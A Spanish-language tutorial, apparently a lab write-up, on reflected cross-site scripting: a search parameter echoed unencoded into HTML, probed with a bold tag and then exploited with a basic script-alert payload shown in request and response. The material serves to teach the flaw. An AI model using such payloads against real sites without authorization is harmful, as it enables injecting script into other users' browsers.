# XSS Reflejado en Contexto HTML sin Codificación

## Introducción a XSS Reflejado
Cross-Site Scripting (XSS) es una vulnerabilidad web que permite a un atacante inyectar scripts maliciosos en páginas vistas por otros usuarios. 

El **XSS Reflejado** ocurre cuando una aplicación web recibe datos de entrada desde una solicitud HTTP y los refleja en la respuesta sin validación o escape adecuado. Esto permite a un atacante inyectar código JavaScript malicioso, que se ejecutará en el navegador de la víctima.

Este tipo de ataque suele aprovecharse a través de enlaces manipulados, enviados a la víctima mediante correos electrónicos, mensajes o formularios falsos.

## Caso: Inyección en un Contexto HTML sin Codificación

Supongamos que tenemos una aplicación web que gestiona búsquedas y refleja la consulta del usuario en la respuesta.

### Respuesta original de la web:
Cuando realizamos una búsqueda de la palabra `test`, la respuesta generada por el servidor es:

```
/?search=test

<section class=blog-header>
    <h1>0 search results for 'test'</h1>
    <hr>
</section>
```

El contenido de `search` es insertado directamente en el HTML sin ningún tipo de codificación o sanitización.

### Probando la inyección de HTML
Si modificamos la búsqueda para incluir etiquetas HTML, podemos observar que la página las interpreta sin restricciones:

#### Petición:
```
GET /?search=test<b>test</b>
```

#### Respuesta generada:
```html
<h1>0 search results for 'test<b>test</b>'</h1>
```

Esto nos indica que el sitio web no está escapando los caracteres especiales, lo que nos permite inyectar código JavaScript.

### Ejecución de un **alert()**
Si en lugar de etiquetas HTML inyectamos un `<script>`, podemos hacer que se ejecute un código arbitrario en el navegador del usuario:

#### Petición maliciosa:
```
GET /?search=<script>alert("Hacked!");</script>
```

#### Respuesta generada:
```html
<h1>0 search results for '<script>alert("Hacked!");</script>'</h1>
```

### Resultado:
Al visitar este enlace, el navegador interpretará el `<script>` y ejecutará `alert("Hacked!");`, mostrando un cuadro de alerta con el mensaje "Hacked!".

